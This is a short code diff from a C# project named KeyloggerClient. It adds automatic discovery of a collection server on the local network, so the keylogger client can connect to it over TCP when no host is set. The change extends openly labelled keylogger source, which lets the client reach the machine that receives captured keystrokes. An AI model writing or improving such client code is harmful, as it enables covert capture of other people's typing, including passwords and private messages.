@@ -43,7 +43,17 @@ namespace KeyloggerClient
         {
             try
             {
+                if (host == "127.0.0.1") // default means discover automatically
+                {
+                    string discoveredIp = await ServerDiscovery.DiscoverServerAsync();
+                    if (discoveredIp == null)
+                        throw new KeyloggerException("Server discovery failed. No server found on local network.");
+
+                    host = discoveredIp;
+                }
+
                 client = new TcpClient(host, port);
+
                 stream = client.GetStream();
 
                 /// <summary>
